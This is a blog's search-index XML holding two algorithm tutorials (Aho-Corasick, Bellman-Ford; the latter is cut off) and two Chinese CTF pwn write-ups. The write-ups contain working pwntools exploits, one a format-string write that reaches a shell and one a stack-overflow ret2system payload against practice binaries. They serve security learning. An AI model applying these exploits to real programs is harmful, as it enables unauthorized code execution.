<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AC自动机算法</title>
    <url>/2020/11/27/AC%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>AC</code>自动机，英文是<code>Aho-Corasick automaton</code>，该算法在1975年产生于贝尔实验室，是著名的多模匹配算法。</p>
<p>该算法借助<code>Trie</code>，即字典树，配以失配指针，在多模式串匹配中有着极高的效率。</p>
<p>算法的第一步是根据所有的模式串构建一颗字典树，然后就是添加失配指针，最后是模式匹配过程。</p>
<p>在只有一个模式串的时候，一般采用<code>KMP</code>算法，该算法核心在于<code>next[]</code>数组，该数组作用是当遇到当前字符不匹配的时候，模式串该如何移动。面对很多模式串的时候，如果对每一个模式串都采用<code>KMP</code>算法，这样虽然理论上可行，但是时间复杂度非常之高。</p>
<p><code>AC</code>自动机中的<code>Fail</code>指针的作用也是类似<code>next[]</code>，不过这个失配指针的构建是根据模式串之间的公共后缀进行构建的。<a id="more"></a></p>
<h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p><a href="https://www.luogu.com.cn/problem/P3808" target="_blank" rel="noopener">洛谷P3808 AC自动机模版</a></p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DESC (1000001)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLE_LEN (26)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KW_LEN (51)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NODE_LEN (1000006)</span></span><br><span class="line"><span class="comment">// #define NODE_LEN (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ROOT (0)</span></span><br><span class="line"><span class="keyword">char</span> dscri[NODE_LEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> child[TABLE_LEN];</span><br><span class="line">    <span class="keyword">int</span> fail;</span><br><span class="line">    <span class="keyword">char</span> name;</span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">&#125; AC[NODE_LEN];</span><br><span class="line"><span class="keyword">int</span> nodePtr = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">addFail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; myQueue;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++)</span><br><span class="line">        <span class="keyword">if</span> (AC[ROOT].child[i]) myQueue.push(AC[ROOT].child[i]);</span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty()) &#123;</span><br><span class="line">        <span class="keyword">int</span> father = myQueue.front();</span><br><span class="line">        myQueue.pop();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; TABLE_LEN; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> childId = AC[father].child[i];</span><br><span class="line">            <span class="keyword">if</span> (childId) &#123;</span><br><span class="line">                <span class="comment">// 若AC[father].fail节点没有子节点i  则AC[childId].fail为0</span></span><br><span class="line">                <span class="comment">// 即根节点</span></span><br><span class="line">                AC[childId].fail = AC[AC[father].fail].child[i];</span><br><span class="line">                myQueue.push(childId);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                AC[father].child[i] = AC[AC[father].fail].child[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trieInsert</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">word</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT, len = <span class="built_in">strlen</span>(<span class="keyword">word</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = <span class="keyword">word</span>[i] - <span class="string">'a'</span>;</span><br><span class="line">        <span class="keyword">if</span> (!AC[now].child[c]) &#123;</span><br><span class="line">            AC[now].child[c] = nodePtr++;</span><br><span class="line">            AC[AC[now].child[c]].name = c + <span class="string">'a'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">    &#125;</span><br><span class="line">    AC[now].cnt++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acQuery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(dscri), sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> now = ROOT;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> c = dscri[i] - <span class="string">'a'</span>;</span><br><span class="line">        now = AC[now].child[c];</span><br><span class="line">        <span class="comment">// 循环求解是因为fail指向的节点也和该节点有相同部分</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = now; j &amp;&amp; AC[j].cnt != <span class="number">-1</span>; j = AC[j].fail) &#123;</span><br><span class="line">            sum += AC[j].cnt;</span><br><span class="line">            AC[j].cnt = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> caseNum, n;</span><br><span class="line">    <span class="keyword">char</span> p[NODE_LEN];</span><br><span class="line">    <span class="built_in">memset</span>(AC, <span class="number">0</span>, <span class="keyword">sizeof</span>(AC));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p);</span><br><span class="line">        trieInsert(p);</span><br><span class="line">    &#125;</span><br><span class="line">    addFail();</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, dscri);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, acQuery());</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>BFS</tag>
        <tag>AC自动机</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-[第五空间2019 决赛]PWN5题解</title>
    <url>/2022/08/29/BUUCTF-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>考点：格式化字符串漏洞-覆盖指定地址为小数字。</p>
<p>本文需要你了解字符串漏洞相关知识，如果尚未了解，可移步至<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/" target="_blank" rel="noopener">【ctf-wiki】</a>学习</p>
<p>下载文件以后，查看文件信息：<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file pwn           </span></span><br><span class="line">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6a8aa744920dda62e84d44fcc440c05f31c4c23d, stripped</span><br></pre></td></tr></table></figure>

<p>查看保护信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols        No    0               2               pwn</span><br></pre></td></tr></table></figure>

<p><strong>Canary</strong>出现了，那栈溢出就使不得了，<strong>NX</strong>开启意味着栈中数据没有执行权限，真可谓重重难关。</p>
<p>然后运行一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn           </span></span><br><span class="line">your name:yalexin</span><br><span class="line">Hello,yalexin</span><br><span class="line">your passwd:123456</span><br><span class="line">fail</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">Hello,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�your passwd:fail</span><br></pre></td></tr></table></figure>

<p>买看出啥端倪，那就继续使用IDA32位程序看一下：</p>
<p>关键代码和注释如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">v1 = time(<span class="number">0</span>);</span><br><span class="line">srand(v1);</span><br><span class="line">fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 使用种子以后，产生随机数，写到unk_804C044中</span></span><br><span class="line"><span class="built_in">read</span>(fd, &amp;unk_804C044, <span class="number">4u</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your name:"</span>);</span><br><span class="line"><span class="comment">// buf到栈底的长度有0x70h，但是我们只能输入 0x63h，也就是我们无法在这里溢出</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x63</span>u);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Hello,"</span>);</span><br><span class="line"><span class="comment">// 看到了这样子使用printf函数，立即推格式化字符串漏洞！</span></span><br><span class="line"><span class="built_in">printf</span>(&amp;buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your passwd:"</span>);</span><br><span class="line"><span class="comment">// 同理，在这里我们也无法在这里溢出</span></span><br><span class="line"><span class="built_in">read</span>(<span class="number">0</span>, &amp;nptr, <span class="number">0xF</span>u);</span><br><span class="line"><span class="comment">// 我们可以通过格式化字符串漏洞把这个数据泄露出来，然后再输入该值，也可以直接修改该值</span></span><br><span class="line"><span class="keyword">if</span> ( atoi(&amp;nptr) == unk_804C044 )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"ok!!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"fail"</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>由于我们的随机数变量<code>unk_804C044</code>是存储在<code>bss</code>段，并不在栈上，我们无法得知该值，那我们可以换个思路，直接修改该变量的值。</p>
<p>在此之前，我们要先确定我们输入的字符串偏移量，即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./pwn</span></span><br><span class="line">your name:abcd%p 2:%p 3:%p 4:%p 5:%p 6:%p 7:%p 8:%p 9:%p 10:%p 11:%p</span><br><span class="line">Hello,abcd0xffa91108 2:0x63 3:(nil) 4:0xf7f55b30 5:0x3 6:0xf7f1b420 7:0x1 8:(nil) 9:0x1 10:0x64636261 11:0x32207025</span><br></pre></td></tr></table></figure>

<p>可以看到该字符串在<code>printf</code>函数中的位置相较于第一个参数的偏移量是10。</p>
<p>通过IDA我们可以知道随机变量存放的地址为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.bss:0804C044 unk_804C044     db    ? ;               ; DATA XREF: main+77↑o</span><br></pre></td></tr></table></figure>

<p>下面我们就可以着手通过下面的方式修改指定内存的值了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">addr%10$n</span><br></pre></td></tr></table></figure>

<p><code>%10$n</code>是说将已经输出的个数写入<code>addr</code>所指向的地址。我们的地址是32位的，即4个字节，那么我们此时已经将指定地址修改为4了。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os=<span class="string">'linux'</span>, arch=<span class="string">'i386'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">''</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">random_var_addr = <span class="number">0x0804c044</span></span><br><span class="line"></span><br><span class="line">payload = p32(random_var_addr) + <span class="string">b'%10$n'</span></span><br><span class="line">hacker.sendlineafter(<span class="string">'your name:'</span>, payload)</span><br><span class="line">line = hacker.recvuntil(<span class="string">'your passwd:'</span>)</span><br><span class="line">hacker.sendline(<span class="string">b'4'</span>)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p><code>pwn</code>入门是真的难！！<del>即使我已经学了编译原理、汇编和组成原理</del>（当然可能也是因为没学好）。</p>
<p>除此之外，IDA反编译出来的代码只能作为参考，切记奉为圭臬，之前刚刚学习的时候，遇到反汇编出来的代码中，定义变量的顺序是反的，变量类型也出错，搞得我郁闷了好几天，还好同班的大佬指出了我的错误。</p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-jarvisoj-level2题解</title>
    <url>/2022/08/29/BUUCTF-jarvisoj-level2%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>考点：栈溢出漏洞。</p>
<p>本文需要你了解栈溢出漏洞相关知识，如果尚未了解，可移步至<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank" rel="noopener">【ctf-wiki】</a>学习</p>
<p>下载文件以后，查看文件信息：<a id="more"></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file level2</span></span><br><span class="line">level2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a70b92e1fe190db1189ccad3b6ecd7bb7b4dd9c0, not stripped</span><br></pre></td></tr></table></figure>

<p>查看保护信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> checksec --file=level2</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH   Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols     No    0               1               level2</span><br></pre></td></tr></table></figure>

<p>没有发现<code>canary</code>，说明我们有机会溢出，为什么说有机会呢？万一我们都无法利用<code>puts</code>函数呢，又或者输入长度被限制了呢？</p>
<p><code>NX</code>也开启了，那程序就无法将栈上的数据作为指令来运行。</p>
<p>继续运行看看：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">yalexin</span><br><span class="line">Hello World!</span><br><span class="line"><span class="meta">$</span><span class="bash"> ./level2</span></span><br><span class="line">Input:</span><br><span class="line">111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">zsh: segmentation fault  ./level2</span><br></pre></td></tr></table></figure>

<p>看来可能是溢出了。</p>
<p>继续使用IDA32反编译看看，<code>main</code>函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">"echo 'Hello World!'"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进去第一个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">"echo Input:"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，<code>buf</code>的长度是<code>0x88h</code>，我们能够输入的长度是<code>0x100</code>，满足溢出条件！</p>
<p>继续观察，看看有没有可以利用的函数：</p>
<p><img src="https://cdn.yalexin.top/image-20220829233139496.png" alt="image-20220829233139496"></p>
<p>我们花了2.12s发现了一个调用了<code>system</code>函数的函数，那么我们直接通过溢出，设置返回地址到该地址，然后传递<code>/bin/sh</code>作为参数，获取<code>shell</code>即可。</p>
<p>继续看看有没有可以利用的字符串：</p>
<p><img src="https://cdn.yalexin.top/image-20220829233607425.png" alt="image-20220829233607425"></p>
<p>继续花了3.02s发现了<code>/bin/sh</code>的地址。</p>
<p>因此我们可以构造这样子的<code>payload</code>，使得执行完<code>read()</code>函数后，程序直接跳转到<code>_system()</code>函数，进而执行<code>system</code>函数。</p>
<p>本程序是32程序，gcc编译的32位程序，遵循这样的函数调用准则：</p>
<ol>
<li>调用方将实参保存到栈中</li>
<li>被调方使用栈顶偏移量的方式访问保存到栈中的变量</li>
<li>程序刚刚进入函数时候，也就是将要执行该函数的第一条指令时，栈顶保存的是执行完该被调函数后的返回地址，栈顶的下面（我们规定上面是低地址，下面是高地址）依次保存着该调用函数用到的形参，注意分别对应着从<strong>右到左</strong>的参数</li>
</ol>
<p>那么本题的<code>payload</code>就应该长这样子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br></pre></td></tr></table></figure>

<p><code>padding * b&#39;a&#39;</code>理论上可以随意跟上一个地址，该地址将来成为函数调用返回后的栈底地址，这里我设置了一个通过在<code>gdb</code>环境下看到的栈开始的地址。</p>
<p>完整payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>, os = <span class="string">'linux'</span>, arch = <span class="string">'amd64'</span>)</span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line">hacker = <span class="literal">None</span> </span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    hacker = process(<span class="string">'./level2'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    hacker = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">27312</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x88</span></span><br><span class="line">system_func_addr = <span class="number">0x8048320</span></span><br><span class="line">bin_sh_str_addr = <span class="number">0x0804a024</span></span><br><span class="line"><span class="comment">#  首先先将该字符串数组填满，再输入一个地址，该地址将会作为新的栈底地址 ebp</span></span><br><span class="line"><span class="comment"># 再接着写入 函数调用返回的地址（即该值将来会pop 到 eip 中），即执行我们的system函数，为了把 字符串 /bin/sh 地址传入，我们还要往栈中随意插入一个将来的返回地址，再插入/bin/sh 地址</span></span><br><span class="line">payload = padding * <span class="string">b'a'</span> + p32(<span class="number">0xffffe000</span>) + p32(system_func_addr) + p32(<span class="number">0xffffe000</span>) + p32(bin_sh_str_addr)</span><br><span class="line"></span><br><span class="line">hacker.sendlineafter(<span class="string">b'Input:\n'</span>, payload)</span><br><span class="line">hacker.interactive()</span><br></pre></td></tr></table></figure>

<hr>
<p>本题难度应该不大，可是为什么在BUUCTF中，为什么通过该题的人数竟然比一些我认为比较难的题目的还少？？</p>
<p><img src="https://cdn.yalexin.top/image-20220830000538728.png" alt="image-20220830000538728"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>Bellman-Ford算法模板</title>
    <url>/2021/04/24/Bellman-Ford%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<p><code>Bellman-Ford</code>与 <code>Dijkstra</code>算法一样，也是用于求带权图的最短路，不过与后者相比，前者可以解决边权为负数的情况，适应性较强；</p>
<p>算法主要的流程是对每一个点根据边进行松弛操作，最终求得最优解的过程。</p>
<p>算法的时间复杂度是<code>O（V*E）</code><a id="more"></a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">1501</span>, MAX_M = <span class="number">5e4</span> + <span class="number">1</span>, INF = <span class="number">0x7f7f7f7f</span>, START = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> n, m, minD[MAX_N], pre[MAX_N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Edge</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">&#125;edges[MAX_M];</span><br><span class="line"><span class="comment">// 快读</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">char</span> ch = getchar();</span><br><span class="line">    <span class="keyword">while</span>(ch &lt; <span class="string">'0'</span> || ch &gt; <span class="string">'9'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">'-'</span>)ok = <span class="literal">true</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>)&#123;</span><br><span class="line">        sum = (sum &lt;&lt; <span class="number">1</span>) + (sum &lt;&lt; <span class="number">3</span>) + ch - <span class="string">'0'</span>;</span><br><span class="line">        ch = getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ok ? -sum : sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> son)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (son != pre[son])&#123;</span><br><span class="line">        dfs(pre[son]);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"-&gt;"</span> &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; son &lt;&lt; <span class="built_in">flush</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_path</span><span class="params">(<span class="keyword">int</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (root != pre[root]) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d--&gt;"</span>, root);</span><br><span class="line">        root = pre[root];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (root == pre[root]) <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"nodeId: "</span> &lt;&lt; i &lt;&lt; <span class="string">", minLen : "</span> &lt;&lt; minD[i] &lt;&lt; <span class="string">", path : "</span> &lt;&lt; ends;</span><br><span class="line">        dfs(i);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不存在负环的时候，minD中保存的就是从起始点到各个点的最短路权值</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Bellman_Ford</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(minD, <span class="number">0x7f</span>, <span class="keyword">sizeof</span> minD);</span><br><span class="line">    minD[START] = <span class="number">0</span>, pre[START] = START;</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)&#123;</span><br><span class="line">            u = edges[j].u, v = edges[j].v, w = edges[j].w;</span><br><span class="line">            <span class="keyword">if</span> (minD[u] + w &lt; minD[v])&#123;</span><br><span class="line">                minD[v] = minD[u] + w;</span><br><span class="line">                pre[v] = u;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">bool</span> ok = <span class="literal">true</span>;  <span class="comment">//判断是否含有负权回路</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)</span><br><span class="line">        <span class="keyword">if</span> (minD[edges[i].v] &gt; minD[edges[i].u] + edges[i].w) &#123;</span><br><span class="line">            ok = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> ok;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    n = <span class="built_in">read</span>(), m = <span class="built_in">read</span>();</span><br><span class="line">    <span class="keyword">int</span> u, v, w;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)&#123;</span><br><span class="line">        <span class="comment">// 有向图</span></span><br><span class="line">        u = <span class="built_in">read</span>(), v = <span class="built_in">read</span>(), w = <span class="built_in">read</span>();</span><br><span class="line">        edges[i].u = u, edges[i].v = v, edges[i].w = w;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (Bellman_Ford())&#123;</span><br><span class="line">        <span class="built_in">print</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"not exit!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span 